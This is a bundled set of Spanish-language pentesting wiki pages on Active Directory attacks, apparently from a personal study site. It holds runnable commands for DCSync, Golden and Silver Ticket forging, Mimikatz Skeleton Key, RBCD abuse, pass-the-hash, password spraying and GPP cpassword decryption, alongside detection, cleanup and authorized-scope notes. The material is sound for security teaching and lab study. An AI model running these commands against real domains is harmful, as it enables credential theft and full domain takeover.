> **Esta sección es educativa y de laboratorio.** Esta guía NO presenta borrar logs o desactivar Windows Defender como práctica normal de pentesting profesional. En un compromiso autorizado, las reglas de alcance (*rules of engagement*) determinan qué es aceptable, y la manipulación de logging o de controles de seguridad debe acordarse explícitamente con el cliente de antemano. El objetivo aquí es **entender los conceptos y cómo se detectan/defienden**, no proporcionar recetas de evasión para entornos reales.

OPSEC, en un ejercicio autorizado, significa ser consciente de qué deja rastro cada acción para poder **documentarlo** y, si el alcance lo pide, modular el ruido — no "hacerse invisible". Conviene conocer los mecanismos que registran la actividad:

| Mecanismo | Qué registra | Cómo lo ve el defensor |
|---|---|---|
| **PowerShell ScriptBlock Logging** | El contenido de los scripts ejecutados (Event ID 4104) | Es de los registros más valiosos contra tooling en PowerShell. |
| **PowerShell Module Logging** | Invocación de cmdlets y parámetros | Complementa al anterior. |
| **Windows Event Logs** | Autenticaciones (4624/4625), creación de servicios (7045), replicación de directorio (4662), Kerberos (4768/4769) | La columna vertebral de la detección en AD. |
| **Windows Defender / AV / EDR** | Firmas y comportamiento de binarios y scripts | Muchas herramientas públicas tienen firma conocida. |
| **LOLBins** | Binarios legítimos del sistema usados para tareas ofensivas | Su uso anómalo también se monitoriza (p. ej. \`certutil\`, \`rundll32\`). |

Ideas clave, en clave defensiva:

* Las **herramientas públicas** (Mimikatz, Rubeus, SharpHound…) suelen estar firmadas por los AV/EDR; su detección es esperable y, en un pentest, forma parte del resultado (demuestra que la detección funciona).
* Acciones como **DCSync**, creación de servicios (PsExec) o concesión de derechos de replicación generan eventos muy conocidos; son detectables por diseño.
* La parte más útil de OPSEC en un ejercicio autorizado es **registrar qué hiciste y cuándo**, para que el equipo defensor pueda correlacionarlo con sus alertas.

> **Cómo revertir.** Cualquier cambio que el alcance permita hacer sobre logging o controles de seguridad debe revertirse al finalizar (restaurar la configuración de auditoría, reactivar protecciones, y devolver el laboratorio a su estado inicial). Si una acción no se puede revertir con seguridad, no se ejecuta.

Para la detección y defensa concreta de cada técnica ofensiva, cada página de esta sección incluye su apartado de *Detección*. El cierre de un ejercicio se recoge en el [checklist de cleanup](/pentesting/active-directory/reference).`,Rr=`Referencia rápida de Active Directory: puertos, comandos esenciales, matriz de herramientas, tabla de decisión y checklist. Las explicaciones profundas viven en sus páginas; esto es solo para consulta durante una máquina o un pentest autorizado.

***

## Puertos de AD

| Puerto | Servicio | Importancia |
|---|---|---|
| \`53\` | DNS | Descubrimiento de dominio |
| \`88\` | Kerberos | Autenticación AD (AS-REP, Kerberoast) |
| \`135\` | MSRPC | Enumeración / movimiento (WMI, DCOM) |
| \`139\` | SMB / NetBIOS | SMB legacy |
| \`389\` | LDAP | Enumeración AD |
| \`445\` | SMB | Enumeración / acceso / lateral |
| \`464\` | Kerberos (kpasswd) | Cambio de contraseña |
| \`636\` | LDAPS | LDAP sobre SSL |
| \`3268\` | LDAP Global Catalog | Enumeración del forest |
| \`3269\` | LDAPS Global Catalog | Enumeración del forest (SSL) |
| \`3389\` | RDP | Lateral movement |
| \`5985\` | WinRM (HTTP) | PowerShell remoto |
| \`5986\` | WinRM (HTTPS) | PowerShell remoto |

***

## Quick Reference

Comandos por fase. Las explicaciones están en cada página correspondiente.

\`\`\`bash
# DC discovery
nmap -p88,389,445,3268,3269,5985 <target>

# SMB (null / con credenciales)
nxc smb <target>
nxc smb <target> -u <usuario> -p '<password>' --shares --users --computers

# LDAP
ldapsearch -x -H ldap://<dc-ip> -D "<usuario>@<dominio>" -w '<password>' \\
  -b "DC=<dominio>,DC=local" "(objectClass=user)"

# User enumeration
kerbrute userenum -d <dominio> --dc <dc-ip> users.txt
nxc smb <dc-ip> --rid-brute

# AS-REP Roasting
GetNPUsers.py <dominio>/ -no-pass -usersfile users.txt -format hashcat -dc-ip <dc-ip>
hashcat -m 18200 asrep.txt wordlist.txt

# Kerberoasting
GetUserSPNs.py <dominio>/<usuario>:'<password>' -dc-ip <dc-ip> -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt wordlist.txt

# Password spraying (respeta la política de bloqueo)
nxc smb <dc-ip> -u users.txt -p '<password>' --continue-on-success

# BloodHound
bloodhound-python -u <usuario> -p '<password>' -d <dominio> -ns <dc-ip> -c All

# DCSync
secretsdump.py <dominio>/<usuario>:'<password>'@<dc-ip> -just-dc
secretsdump.py <dominio>/<usuario>:'<password>'@<dc-ip> -just-dc-user krbtgt

# Pass-the-Hash
nxc smb <target> -u <usuario> -H <nthash>
evil-winrm -i <target> -u <usuario> -H <nthash>
psexec.py <dominio>/<usuario>@<target> -hashes :<nthash>

# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
klist

# RBCD
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Pass123!' <dominio>/<usuario>:'<password>' -dc-ip <dc-ip>
rbcd.py -delegate-from 'FAKE$' -delegate-to '<TARGET>$' -action write <dominio>/<usuario>:'<password>'
getST.py -spn cifs/<target> -impersonate Administrator <dominio>/'FAKE$':'Pass123!'

# ADCS
certipy find -vulnerable -u <usuario>@<dominio> -p '<password>' -dc-ip <dc-ip>
\`\`\`

> **Nota de compatibilidad.** \`nxc\` (NetExec) es el sucesor moderno de CrackMapExec (\`crackmapexec\`/\`cme\`); la sintaxis es casi idéntica. Usa el que tengas instalado.

***

## Tool Matrix

| Técnica | Linux | Windows |
|---|---|---|
| User Enumeration | Kerbrute / RPC / NetExec | PowerView |
| LDAP | ldapsearch / ldapdomaindump | PowerView |
| SMB | smbclient / NetExec | PowerShell / SMB |
| AS-REP Roasting | GetNPUsers.py | Rubeus |
| Kerberoasting | GetUserSPNs.py | Rubeus |
| BloodHound | bloodhound-python | SharpHound |
| ACL | BloodHound / PowerView | PowerView |
| DCSync | secretsdump.py | Mimikatz |
| Pass-the-Hash | NetExec / PsExec (Impacket) | Mimikatz |
| Pass-the-Ticket | Impacket | Rubeus / Mimikatz |
| Golden Ticket | ticketer.py | Mimikatz / Rubeus |
| Silver Ticket | ticketer.py | Mimikatz |
| RBCD | rbcd.py / getST.py | PowerView / Rubeus |
| ADCS | Certipy | Certipy / Certify |
| Coercion | Coercer / PetitPotam | SpoolSample |
| MSSQL | mssqlclient.py | PowerUpSQL |

***

## Encuentro X → hago Y

| Encuentro | Investigar |
|---|---|
| Puerto \`88\` | [Kerberos](/pentesting/active-directory/kerberos) |
| Puerto \`389\` | [LDAP](/pentesting/active-directory/ldap) |
| Puerto \`445\` | [SMB](/pentesting/active-directory/smb-sysvol) |
| Global Catalog (\`3268\`) | Forest / LDAP |
| Usuario válido | [Password Policy](/pentesting/active-directory/smb-sysvol) |
| Pre-auth deshabilitada | [AS-REP Roast](/pentesting/active-directory/kerberos) |
| SPN | [Kerberoast](/pentesting/active-directory/kerberos) |
| \`GenericAll\` | [ACL Abuse](/pentesting/active-directory/acl-ace) |
| \`GenericWrite\` | [Manipulación de objeto](/pentesting/active-directory/acl-ace) |
| \`WriteDACL\` | [Manipulación de ACL](/pentesting/active-directory/acl-ace) |
| \`WriteOwner\` | [Abuso de propiedad](/pentesting/active-directory/acl-ace) |
| DCSync Rights | [DCSync](/pentesting/active-directory/dcsync) |
| Unconstrained Delegation | [Captura de ticket](/pentesting/active-directory/delegation) |
| Constrained Delegation | [S4U](/pentesting/active-directory/delegation) |
| RBCD | [S4U / impersonación](/pentesting/active-directory/delegation) |
| GPO escribible | [GPO Abuse](/pentesting/active-directory/gpo) |
| NTLM hash | [Pass-the-Hash](/pentesting/active-directory/lateral-movement) |
| Ticket Kerberos | [Pass-the-Ticket](/pentesting/active-directory/lateral-movement) |
| Hash de \`krbtgt\` | [Golden Ticket](/pentesting/active-directory/tickets) |
| Hash de servicio | [Silver Ticket](/pentesting/active-directory/tickets) |
| \`NTDS.dit\` | [Extracción de credenciales](/pentesting/active-directory/credential-dumping) |
| MSSQL | [Linked Servers](/pentesting/active-directory/mssql-trusts) |
| Template ADCS vulnerable | [Abuso de certificados](/pentesting/active-directory/adcs) |
| \`msDS-KeyCredentialLink\` | [Shadow Credentials](/pentesting/active-directory/adcs) |
| LLMNR / NBT-NS | [Responder / Relay](/pentesting/active-directory/ntlm-coercion) |
| Print Spooler | [Coercion](/pentesting/active-directory/ntlm-coercion) |
| Sesión admin existente | [Lateral Movement](/pentesting/active-directory/lateral-movement) |

***

## Decision Tree

\`\`\`text
¿Tengo IP? → enumerar puertos
   ├── ¿88?   → Kerberos
   ├── ¿389?  → LDAP
   ├── ¿445?  → SMB
   └── ¿3268? → Global Catalog (forest)

¿Tengo credenciales?
   ├── NO → User Enumeration · AS-REP Roast · Password Policy · (spray controlado)
   └── SÍ → LDAP · SMB · BloodHound · Kerberoasting · ACL Enumeration
                 ↓
            Attack Path → PrivEsc → Lateral Movement → Domain Dominance
\`\`\`

***

## AD Pentesting Checklist

### Recon
- [ ] Identificar hosts activos
- [ ] Identificar el DC
- [ ] Identificar el dominio
- [ ] Identificar hostname
- [ ] Enumerar puertos

### Enumeración
- [ ] LDAP
- [ ] SMB
- [ ] RPC
- [ ] Usuarios
- [ ] Grupos
- [ ] Equipos
- [ ] Shares
- [ ] GPO
- [ ] SPNs
- [ ] Delegation
- [ ] ACLs

### Credenciales
- [ ] Password Policy
- [ ] Password Spray
- [ ] AS-REP Roasting
- [ ] Kerberoasting
- [ ] GPP (cpassword)
- [ ] Credenciales en descripciones
- [ ] Ficheros con credenciales

### Escalada de privilegios
- [ ] BloodHound
- [ ] ACL Abuse
- [ ] GPO Abuse
- [ ] Delegation
- [ ] RBCD
- [ ] ADCS
- [ ] DCSync

### Lateral Movement
- [ ] SMB
- [ ] PsExec
- [ ] WMI
- [ ] WinRM
- [ ] RDP
- [ ] DCOM
- [ ] MSSQL

### Domain Dominance
- [ ] Domain Admin
- [ ] NTDS.dit
- [ ] krbtgt
- [ ] Golden Ticket
- [ ] Enterprise Admin

### Cleanup
- [ ] Eliminar cuentas temporales
- [ ] Eliminar cuentas de equipo temporales
- [ ] Revertir modificaciones de ACL
- [ ] Revertir RBCD
- [ ] Revertir modificaciones de GPO
- [ ] Eliminar ficheros temporales
- [ ] Restaurar la configuración del laboratorio
`,zr=`SMB es el protocolo de transporte para numerosos servicios de Active Directory: autenticación, recursos compartidos de dominio, políticas de grupo y, en ocasiones, credenciales que quedaron expuestas por configuraciones heredadas. Esta página cubre únicamente lo específico de AD sobre SMB; para la metodología completa de enumeración SMB (shares, null sessions genéricas, RID cycling, enum4linux, etc.) consulta la guía dedicada.

## SMB en Active Directory

La guía completa de enumeración y explotación de SMB está en [\`/pentesting/services/puertos-139-445-smb\`](/pentesting/services/puertos-139-445-smb). Aquí solo se tratan los aspectos que son específicos del contexto de dominio: los recursos compartidos \`SYSVOL\` y \`NETLOGON\`, las políticas de grupo que viajan por ellos, y la política de contraseñas del dominio.

**Herramientas habituales**

| Herramienta | Uso típico en AD |
|---|---|
| \`smbclient\` | Navegar manualmente shares, descargar archivos de SYSVOL |
| \`crackmapexec\` / \`netexec\` (nxc) | Enumeración masiva, validación de credenciales, módulos (\`gpp_password\`, etc.) |
| \`rpcclient\` | Consultas RPC directas (política de contraseñas, usuarios, dominios) |

> **Nota de compatibilidad.** CrackMapExec (CME) está en mantenimiento limitado; su sucesor activo es [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec), con sintaxis prácticamente idéntica. Los ejemplos de esta página muestran ambos donde aplica.

Foco de esta sección: listar shares accesibles con y sin credenciales, identificar permisos de escritura/lectura sobre \`SYSVOL\`/\`NETLOGON\`, y detectar restos de configuración (GPP, scripts de inicio de sesión, credenciales en claro) dejados en esos recursos.

\`\`\`bash
# Listar shares con credenciales válidas
crackmapexec smb <dc-ip> -u <usuario> -p <password> --shares
nxc smb <dc-ip> -u <usuario> -p <password> --shares
\`\`\`

\`\`\`text
SMB   <dc-ip>  445  DC01  [*] Windows Server 2019 (name:DC01) (domain:<dominio>)
SMB   <dc-ip>  445  DC01  [+] <dominio>\\<usuario>:<password>
SMB   <dc-ip>  445  DC01  [+] Enumerated shares
SMB   <dc-ip>  445  DC01  Share           Permissions     Remark
SMB   <dc-ip>  445  DC01  -----           -----------     ------
SMB   <dc-ip>  445  DC01  SYSVOL          READ            Logon server share
SMB   <dc-ip>  445  DC01  NETLOGON        READ            Logon server share
\`\`\`

**Interpretación.** Un acceso de lectura a \`SYSVOL\`/\`NETLOGON\` con cualquier usuario de dominio es normal (son shares públicas por diseño). El valor está en lo que contienen, no en el acceso en sí.

***

## SYSVOL y GPP (Group Policy Preferences)

\`SYSVOL\` es el recurso compartido que replica entre todos los controladores de dominio el contenido de las Group Policy Objects (GPO): scripts de inicio de sesión, plantillas administrativas y, de forma relevante para un pentest, las **Group Policy Preferences (GPP)**. Las GPP permiten a un administrador configurar, entre otras cosas, cuentas locales, unidades de red o tareas programadas — y antes de que Microsoft corrigiera este mecanismo (MS14-025), esas configuraciones podían incluir credenciales.

Las credenciales de GPP se guardan en archivos XML dentro de \`SYSVOL\`, principalmente:

- \`Groups.xml\` — cuentas de usuario/grupo local configuradas vía GPP (el caso más común).
- \`Services.xml\` — credenciales para arrancar servicios.
- \`ScheduledTasks.xml\` — credenciales asociadas a tareas programadas.

El dato interesante es el atributo \`cpassword\`: una contraseña cifrada con AES-256 usando una clave simétrica que Microsoft publicó públicamente en su documentación (para que los propios clientes del dominio pudieran descifrarla al aplicar la política). Esa clave es la misma para **cualquier** instalación de Active Directory del mundo, lo que convierte cualquier \`cpassword\` encontrado en una contraseña en texto claro, en la práctica.

**Montar y recorrer SYSVOL**

\`\`\`bash
# Montar el share (o usar smbclient en modo interactivo/recursivo)
mkdir /mnt/sysvol
mount -t cifs //<dc-ip>/SYSVOL /mnt/sysvol -o username=<usuario>,password=<password>

# Buscar los tres archivos de interés
find /mnt/sysvol -name "Groups.xml" 2>/dev/null
find /mnt/sysvol -name "Services.xml" 2>/dev/null
find /mnt/sysvol -name "ScheduledTasks.xml" 2>/dev/null
\`\`\`

Si \`Groups.xml\` existe y contiene un atributo \`cpassword\` no vacío, el archivo tendrá un aspecto similar a:

\`\`\`text
<Properties userName="svc_backup" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" .../>
\`\`\`

> **Solo laboratorio / entorno autorizado.** Descifrar un \`cpassword\` solo tiene sentido dentro del alcance autorizado de la evaluación. Se trata de una credencial real del dominio objetivo.

**POC — descifrado**

\`\`\`bash
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
\`\`\`

\`\`\`text
P@ssw0rd123!
\`\`\`

**Automatización con NetExec/CrackMapExec.** En lugar de montar SYSVOL y buscar manualmente, el módulo \`gpp_password\` automatiza todo el proceso de búsqueda y descifrado:

\`\`\`bash
crackmapexec smb <dc-ip> -u <usuario> -p <password> -M gpp_password
nxc smb <dc-ip> -u <usuario> -p <password> -M gpp_password
\`\`\`

**Resultado esperado**

\`\`\`text
SMB   <dc-ip>  445  DC01  [+] Found credentials in SYSVOL policy: Groups.xml
SMB   <dc-ip>  445  DC01  [+] Username: svc_backup Password: P@ssw0rd123!
\`\`\`

**Interpretación.** Haber encontrado una credencial válida no implica privilegios de administrador de dominio. Es simplemente una cuenta más, cuyo nivel de acceso real hay que determinar.

**Siguiente paso.** Reutiliza la credencial encontrada frente a otros servicios o usuarios del dominio — ver [password spraying y reutilización de credenciales](/pentesting/active-directory/password-attacks).

***

## Password Policy

Antes de ejecutar cualquier ataque de password spraying o fuerza bruta contra cuentas de AD, es **obligatorio** enumerar la política de bloqueo de cuentas. Probar contraseñas a ciegas, sin conocer el umbral de intentos fallidos, puede bloquear cuentas legítimas de usuarios o servicios y generar un incidente visible — o directamente una interrupción del servicio del cliente.

**Enumeración de la política de contraseñas**

\`\`\`bash
crackmapexec smb <dc-ip> -u <usuario> -p <password> --pass-pol
nxc smb <dc-ip> -u <usuario> -p <password> --pass-pol

# Sin credenciales, vía null session (si el DC lo permite)
rpcclient -U "" -N <dc-ip> -c "getdompwinfo"

# Alternativa con enum4linux
enum4linux -P <dc-ip>
\`\`\`

\`\`\`text
[+] Dumping password policy
Minimum password length: 8
Password history length: 24
Maximum password age: 42 days
Minimum password age: 1 day
Account lockout threshold: 5
Account lockout duration: 30 minutes
Reset lockout counter: 30 minutes
\`\`\`

**Campos clave y por qué importan**

| Campo | Importancia |
|---|---|
| \`Minimum Password Length\` | Orienta qué contraseñas candidatas tienen sentido probar |
| \`Password History\` | Indica si reutilizar contraseñas antiguas es viable como estrategia |
| \`Maximum/Minimum Password Age\` | Contextualiza antigüedad de credenciales encontradas |
| \`Account Lockout Threshold\` | **El dato crítico**: número de intentos fallidos antes de bloquear la cuenta |
| \`Lockout Duration\` | Cuánto tiempo permanece bloqueada una cuenta tras superar el umbral |

> **Nota.** Un \`Account Lockout Threshold\` de \`0\` significa que no hay bloqueo por intentos fallidos — habilita estrategias de prueba más agresivas, pero sigue siendo necesario respetar el alcance autorizado. Un threshold bajo (3-5) exige extremo cuidado: una sola ronda de spraying mal planificada puede bloquear a toda la organización.

**Siguiente paso.** Con el umbral de bloqueo conocido, puedes diseñar un spraying seguro — ver [Password Spraying](/pentesting/active-directory/password-attacks).
`,Br=`Kerberos permite forjar tickets cuando se dispone del material criptográfico adecuado. Esta página cubre la forja de TGTs (Golden Ticket) y TGSs (Silver Ticket), y la modificación directa de LSASS en el DC (Skeleton Key) como mecanismo de persistencia.

## Golden Ticket

**¿Qué es?** Un TGT forjado localmente, sin pasar por el KDC, usando el hash NT de la cuenta \`krbtgt\`. Como \`krbtgt\` firma todos los TGTs del dominio, conocer su hash permite fabricar uno válido para cualquier identidad, incluida la pertenencia a cualquier grupo.

\`\`\`text
Hash NT de krbtgt
        ↓
Domain SID + Domain Name
        ↓
Forjar TGT (ticketer.py / Mimikatz / Rubeus)
        ↓
Autenticación Kerberos como cualquier usuario, con cualquier grupo
\`\`\`

**Requisitos**

- NT hash de la cuenta \`krbtgt\`, normalmente obtenido mediante un DCSync (ver [DCSync](/pentesting/active-directory/dcsync)).
- Domain SID y nombre de dominio.

**Desde Linux (Impacket)**

\`\`\`bash
ticketer.py -nthash <krbtgt_nt> -domain-sid <sid> -domain <dominio> Administrator
export KRB5CCNAME=Administrator.ccache
\`\`\`

**Desde Windows**

\`\`\`powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:<dominio> /sid:<sid> /krbtgt:<krbtgt_nt> /ptt

# Rubeus
Rubeus.exe golden /user:Administrator /domain:<dominio> /sid:<sid> /rc4:<krbtgt_nt> /ptt
\`\`\`

**Parámetros clave**

| Parámetro | Significado |
|---|---|
| \`-nthash\` / \`/krbtgt\` / \`/rc4\` | NT hash de la cuenta \`krbtgt\` |
| \`-domain-sid\` / \`/sid\` | SID del dominio (sin el RID final) |
| \`-domain\` / \`/domain\` | Nombre del dominio |
| \`-groups 512\` | RID de grupo a incluir (512 = Domain Admins); permite ajustar la pertenencia a grupos del ticket forjado |

**Verificación**

\`\`\`bash
klist
psexec.py <dominio>/Administrator@<target> -k -no-pass
\`\`\`

**Resultado esperado**

\`\`\`text
[*] Saving ticket in Administrator.ccache
\`\`\`

Y, tras exportar \`KRB5CCNAME\`, acceso administrativo a cualquier host del dominio sin volver a autenticar contra el KDC.

**Interpretación**: control total y persistente sobre la autenticación Kerberos del dominio mientras el hash de \`krbtgt\` no cambie.

**Cleanup**: un Golden Ticket no se "revoca" por sí mismo; sigue siendo válido mientras el hash de \`krbtgt\` no rote. La única forma de invalidarlo es rotar la contraseña de \`krbtgt\` **dos veces** (la primera rotación deja válida la clave anterior durante un periodo de gracia). Ver [persistence-opsec](/pentesting/active-directory/persistence-opsec) para el procedimiento completo de remediación.

**Detección**: TGTs con tiempos de vida anómalos, ausencia de correlación con un \`AS-REQ\` previo en los logs del DC, RIDs de grupo inconsistentes con el usuario.

> **Solo laboratorio / entorno autorizado.** Un Golden Ticket equivale a persistencia total de dominio; usarlo fuera de un ejercicio controlado y documentado no es aceptable.

**Si falla…**: comprobar que el Domain SID y el nombre de dominio son exactos (errores de mayúsculas/minúsculas o de FQDN rompen la validación), y que el reloj del atacante está sincronizado con el del DC (Kerberos es sensible a *clock skew*).

***

## Silver Ticket

**¿Qué es?** Un TGS (service ticket) forjado directamente con el hash NT de la cuenta de servicio, sin pasar por el DC. Es más limitado que un Golden Ticket pero no requiere contacto con el KDC para forjarlo.

| | Golden Ticket | Silver Ticket |
|---|---|---|
| Hash necesario | \`krbtgt\` | Cuenta de servicio (o de máquina) |
| Tipo de ticket | TGT | TGS |
| Alcance | Todo el dominio | Un servicio concreto |
| Dependencia del DC | Sí, para servicios posteriores | Menor; se forja y usa localmente |
| Objetivo típico | Amplio (cualquier recurso) | Servicio concreto (SPN específico) |

**Clases de servicio habituales**: \`CIFS\` (SMB), \`HTTP\`, \`HOST\`, \`MSSQL\`, \`LDAP\`.

**POC**

\`\`\`bash
ticketer.py -nthash <service_nt> -domain-sid <sid> -domain <dominio> \\
  -spn cifs/<target> Administrator
export KRB5CCNAME=Administrator.ccache
\`\`\`

**Resultado esperado**

\`\`\`text
[*] Saving ticket in Administrator.ccache
\`\`\`

**Interpretación**: acceso al servicio concreto representado por el SPN (por ejemplo, SMB en \`<target>\`) sin necesidad de autenticar contra el DC, usando únicamente el hash de la cuenta de servicio.

**Siguiente paso**: repetir el proceso con otros SPNs de la misma cuenta de servicio si se necesita acceso a más de un recurso, o escalar a [lateral-movement](/pentesting/active-directory/lateral-movement) para ejecución remota sobre el servicio objetivo.

**Detección**: TGS sin el correspondiente TGT previo visible en los logs del DC, actividad del servicio fuera de horario habitual.

***

## Skeleton Key

**¿Qué modifica?** Un parche en memoria sobre LSASS en el controlador de dominio que hace que **cualquier cuenta** del dominio pueda autenticarse también con una contraseña maestra común, además de su contraseña real.

**¿Dónde reside?** Únicamente en la memoria del proceso LSASS del DC parcheado. No se escribe en disco ni en la base de datos de AD.

**¿Qué privilegios necesita?** Privilegios de Domain Admin (o equivalentes) y acceso interactivo o remoto suficiente para ejecutar código en el DC.

**¿Qué ocurre tras reiniciar?** El parche se pierde por completo: al reiniciar el DC, LSASS vuelve a su comportamiento normal y la contraseña maestra deja de funcionar.

**Limitaciones**: solo afecta al DC en el que se aplicó (en un entorno con varios DCs hay que repetirlo en cada uno); es ruidoso si hay EDR monitorizando LSASS; no sobrevive a un reinicio, por lo que no es persistencia "dura".

**POC (Windows, Mimikatz)**

\`\`\`powershell
privilege::debug
misc::skeleton
\`\`\`

**Resultado esperado**

\`\`\`text
mimikatz(powershell) # misc::skeleton
[KDC] data
[KDC] key
[RC4] functions : 0x...
Patch OK
\`\`\`

A partir de este punto, cualquier cuenta del dominio puede autenticarse usando su contraseña real **o** la contraseña maestra \`mimikatz\`.

**Interpretación**: acceso de respaldo a cualquier cuenta del dominio mientras el DC no se reinicie, útil como mecanismo de persistencia a corto plazo durante un ejercicio.

**Cleanup**: reiniciar el DC afectado elimina el parche. No existe otra forma de revertirlo limpiamente, por lo que debe planificarse como parte del cierre del ejercicio.

> **Solo laboratorio / entorno autorizado — técnica de alto impacto.** Skeleton Key afecta la autenticación de todo el dominio mientras está activa. No debe aplicarse fuera de un entorno de laboratorio o un ejercicio con autorización explícita y ventana de mantenimiento acordada.

Relacionado: [credential-dumping](/pentesting/active-directory/credential-dumping), [lateral-movement](/pentesting/active-directory/lateral-movement), [persistence-opsec](/pentesting/active-directory/persistence-opsec).
`,Vr=`La enumeración es el proceso de establecer una conexión activa con el sistema para descubrir vectores de ataque potenciales. El objetivo es identificar servicios, versiones y configuraciones vulnerables.

---

## Metodología de Reconocimiento

He dividido esta fase en diferentes vectores según el objetivo:

| Técnica | Herramienta Principal | Documentación |
| :--- | :--- | :--- |
| **Escaneo de Puertos** | \`Nmap\` | [Comandos de Red](/pentesting/enumeration/comandos-de-red) |
| **Host Discovery** | \`ARP-Scan\` / \`Nmap\` | [Descubrimiento de Hosts](/pentesting/enumeration/descubrimiento-de-hosts) |
| **Fuzzing Web** | \`Gobuster\` | [Gobuster Guide](/pentesting/enumeration/gobuster-fuzzing-web) |
| **Fuzzing Avanzado** | \`FFUF\` | [FFUF Masterclass](/pentesting/enumeration/ffuf-fuzzing-web) |
| **Directorios Web** | \`Dirbuster\` | [Dirbuster Lab](/pentesting/enumeration/dirbuster-fuzzing-web) |
| **Auditoría Web** | \`Nikto\` | [Nikto Scanner](/pentesting/enumeration/nikto-escaner-web) |
| **Subdominios** | \`Subfinder\` | [Subfinder Guide](/pentesting/enumeration/subfinder) |

---

## Notas de Estudio
Pro Tip: Durante la enumeración, siempre guarda los resultados en archivos de texto (-oN en Nmap) para consultarlos más tarde sin tener que repetir el escaneo.
Enumeración DNS: Comprobar siempre transferencias de zona.
Enumeración SMB: Listar recursos compartidos sin credenciales (Null Sessions).
Enumeración SNMP: Utilizar onesixtyone para encontrar comunidades públicas.

## Comunidad y Contenido
Sigue mi progreso y contenido adicional en:

* **YouTube**  [bitsofalber](https://www.youtube.com/@bitsofalber)
* **Instagram**  [@bitsofalber](https://www.instagram.com/bitsofalber/)
* **LinkedIn**  [ahidalgotech](https://linkedin.com/in/ahidalgotech)

---
`,Hr=`### Una recopilación de comandos esenciales para gestionar y diagnosticar redes en **Linux, Windows y macOS**.

***

### 1. Routing - Tabla de Enrutamiento

| **Sistema Operativo**   | **Comando**   |
| ----------------------- | ------------- |
|  **Linux**            | \`ip route\`    |
|  **Windows**         | \`route print\` |
|  **Mac OS X / Linux** | \`netstat -r\`  |

<figure><img src="/pentesting/assets/image-60.png" alt=""><figcaption></figcaption></figure>

### **Descripción:** Estos comandos muestran la tabla de enrutamiento de la red, permitiendo identificar cómo se dirigen los paquetes.

***

### 2. IP - Información de Interfaces de Red

| **Sistema Operativo**   | **Comando**                                          |
| ----------------------- | ---------------------------------------------------- |
|  **Linux**            | <p><code>ip a</code><br><code>ip -br -c a</code></p> |
|  **Windows**         | \`ipconfig /all\`                                      |
|  **Mac OS X / Linux** | \`ifconfig\`                                           |

<figure><img src="/pentesting/assets/image-59.png" alt=""><figcaption><p>Posible sálida del comando <code>ip -a</code></p></figcaption></figure>

### **Descripción:** Muestra información detallada sobre las interfaces de red, direcciones IP asignadas y configuraciones activas.
`,Ur=`## Descubrir equipos activos en nuestra red:

\`\`\`bash
ip a # Muestra las direcciones IP asignadas a las interfaces de red del sistema.
ifconfig # Saber nuestra interfaz de red y nuestra ip
netdiscover -r <ip>/24 # Indicamos nuestro segmento de red
fping -a -g <ip/24>
sudo masscan -p<puertos> -Pn <rango_de_red> # Podemos analizar nuestra interfaz de red indicandole que nos busque por puertos específicos.
arp-scan -I <interfaz_de_red> --localnet --ignoredups # Buscar hosts en nuestra red local.
nmap -sn <ip>/24 #manda paquetes ICMP a ese segmento de red
sudo nmap -sS --min-rate 5000 -p- --open <ip> -oN tcp_scan.txt # Podemos añadir multiples ips separadas por ","
grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
nmap --open -p<puertos> -sC -sV <ips> -Pn -On full_scan.txt\`
\`\`\`

>  **Uso de múltiples herramientas:** En cada fase del examen, es fundamental emplear diferentes herramientas para realizar la misma tarea. Esto ayuda a reducir la posibilidad de falsos positivos o negativos.

## ¿Qué hacemos cuando identificamos los equipos accesibles?

> Es imprescindible **documentar** cada hallazgo, incluyendo:\\
>  Hosts detectados\\
>  Credenciales obtenidas\\
>  Subdominios encontrados\\
>  Otros datos relevantes

## Análisis de Hosts

Una vez identificadas las direcciones **IP**, debemos analizarlas en detalle. Para ello, utilizaremos **Nmap** y determinaremos qué puertos están activos en cada host con el siguiente comando:

\`\`\`ruby
nmap -p- --open -T5 -sS -Pn -n -vvv <ip> -oN <output_name.txt> # Con este escaneo vamos a realizar un descubrimiento de puertos de manera rápida y mostrando por pantalla unicamente los puertos que encuentre abiertos y que me escanee los 65535 puertos y exportamos los resultados.
\`\`\`

> ####  **Exportación del Escaneo y Análisis de Puertos**
>
> Al **exportar el escaneo**, garantizamos la posibilidad de acceder a la información en cualquier momento para su revisión. Esto facilita el análisis posterior, permitiendo consultarla con comandos como: \`cat\`

 **Puertos más comunes que podemos encontrar:**

<figure><img src="/pentesting/assets/carbon-1.png" alt=""><figcaption><p>Listado de los puertos mas comunes que nos podemos encontrar en el examen.</p></figcaption></figure>

## Análisis de Servicios y Versiones con Nmap

Una vez que hemos identificado qué puertos están abiertos, cerrados o filtrados en una dirección IP (por ejemplo, puertos **21**, **80**, **445**, etc.), el siguiente paso es analizar qué servicios están corriendo en esos puertos y qué versiones de esos servicios están activas.

Para realizar este análisis, utilizaremos los **scripts de Nmap** que vienen por defecto. Con el siguiente comando, podremos obtener información detallada sobre los servicios y sus versiones:

\`\`\`ruby
nmap -p<puertos> <ip> -sCV -oN <output_name.txt> # Con este escaneo vamos a realizar lo anteriormente dicho.
\`\`\`

### Scripts Específicos de Nmap

Una vez que tengamos el informe de los servicios y las versiones de cada puerto, es importante tener en cuenta que **Nmap** incluye una serie de **scripts específicos** para cada puerto detectado. Estos scripts nos permiten realizar análisis más profundos y detallados, tales como:

| Puerto       | Servicio                                | Scripts NSE                                                                                                 |
| ------------ | --------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **21**       | FTP (File Transfer Protocol)            | ftp-anon, ftp-bounce, ftp-brute, ftp-syst, ftp-proftpd-backdoor                                             |
| **22**       | SSH (Secure Shell)                      | ssh-brute, ssh-auth-methods, ssh-hostkey, ssh-run, sshv1                                                    |
| **23**       | Telnet                                  | telnet-brute, telnet-encryption, telnet-ntlm-info, telnet-robot                                             |
| **25**       | SMTP (Simple Mail Transfer Protocol)    | smtp-brute, smtp-open-relay, smtp-enum-users, smtp-ntlm-info, smtp-strangeport                              |
